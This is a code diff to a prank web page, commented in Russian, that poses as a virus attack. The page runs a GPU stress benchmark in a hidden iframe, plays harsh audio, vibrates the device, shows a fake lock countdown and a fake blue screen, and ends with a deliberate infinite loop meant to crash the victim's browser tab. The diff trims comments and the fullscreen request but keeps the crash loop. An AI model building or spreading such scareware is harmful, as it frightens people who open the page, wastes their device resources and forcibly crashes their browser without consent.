@@ -12,7 +12,7 @@
   #stress-layer { 
     position: fixed; inset: 0; width: 100vw; height: 100vh; 
     z-index: 1; border: none; pointer-events: none;
-    opacity: 0.6; /* Чуть приглушен, чтобы текст читался */
+    opacity: 0.6;
   }
 
   /* ЛОВУШКА */
@@ -63,7 +63,7 @@
 </head>
 <body>
 
-<!-- ТЯЖЕЛЫЙ CZNULL НА ЗАДНЕМ ФОНЕ -->
+<!-- ТЯЖЕЛЫЙ CZNULL НА ЗАДНЕМ ФОНЕ (убран allow="fullscreen") -->
 <iframe id="stress-layer" src="https://cznull.github.io/vsbm"></iframe>
 
 <!-- ЛОВУШКА -->
@@ -84,7 +84,7 @@
   </div>
 </div>
 
-<!-- УТКА (Ссылка на реальную картинку с Imgur) -->
+<!-- УТКА -->
 <img id="duck-face" src="https://i.imgur.com/2Y6v9uW.jpeg" alt="AI Duck">
 
 <!-- BSOD -->
@@ -138,10 +138,7 @@ function startHell() {
         virusContainer.style.display = 'block';
         document.body.classList.add('shaking');
         
-        // Включаем полный экран (скрываем панели браузера)
-        if (document.documentElement.requestFullscreen) {
-            document.documentElement.requestFullscreen().catch(() => {});
-        }
+        // Я УБРАЛ ОТСЮДА requestFullscreen, чтобы не вылезало окно!
         
         startDroneSound();
         startTerminal();
@@ -204,7 +201,7 @@ function startTerminal() {
 
 function startCountdown() {
     isLocked = true;
-    endTime = Date.now() + 10000; // 10 секунд до конца
+    endTime = Date.now() + 10000;
     const timerEl = document.getElementById('timer');
     const lockOverlay = document.getElementById('lock-overlay');
     const glitchLayer = document.getElementById('glitch-layer');
@@ -250,20 +247,15 @@ function endPrank() {
         try { droneOscillator.stop(); } catch(e) {}
     }
 
-    // 1. СКРЫВАЕМ ВИРУС
     virusContainer.style.display = 'none';
-    
-    // 2. ПОКАЗЫВАЕМ УТКУ НА ВЕСЬ ЭКРАН
     const duck = document.getElementById('duck-face');
     duck.style.display = 'block';
     
-    // 3. ОРЕМ И ВИБРИРУЕМ
     if (audioCtx && audioCtx.state === 'running') {
         for(let i=0; i<5; i++) setTimeout(playHarshGlitch, i * 100);
     }
     if (navigator.vibrate) navigator.vibrate([800, 200, 800, 200, 800]);
 
-    // 4. ЧЕРЕЗ 4 СЕКУНДЫ УБИРАЕМ УТКУ И ПОКАЗЫВАЕМ BSOD
     setTimeout(() => {
         duck.style.display = 'none';
         document.getElementById('final').style.display = 'flex';
@@ -275,17 +267,11 @@ function endPrank() {
         }
         document.getElementById('memory-dump').textContent = dump;
 
-        // 5. УБИЙСТВО БРАУЗЕРА (ВЫЗОВ "ОПАНЬКИ")
-        // Ждем 1.5 секунды, чтобы пользователь прочитал синий экран, и запускаем вечный цикл.
-        // Chrome поймет, что вкладка зависла, и принудительно ее убьет.
+        // УБИЙСТВО БРАУЗЕРА (ВЫЗОВ "ОПАНЬКИ")
         setTimeout(() => {
-            // Отключаем iframe с cznull, чтобы он не мешал
             document.getElementById('stress-layer').style.display = 'none';
-            
-            // БЕСКОНЕЧНЫЙ ЦИКЛ - ГАРАНТИРОВАННЫЙ КРАШ ВКЛАДКИ
-            while(true) {
-                // Chrome увидит, что этот цикл никогда не закончится, и убьет вкладку (Aw, Snap!)
-            }
+            // Бесконечный цикл для краша
+            while(true) {}
         }, 1500); 
 
     }, 4000); 
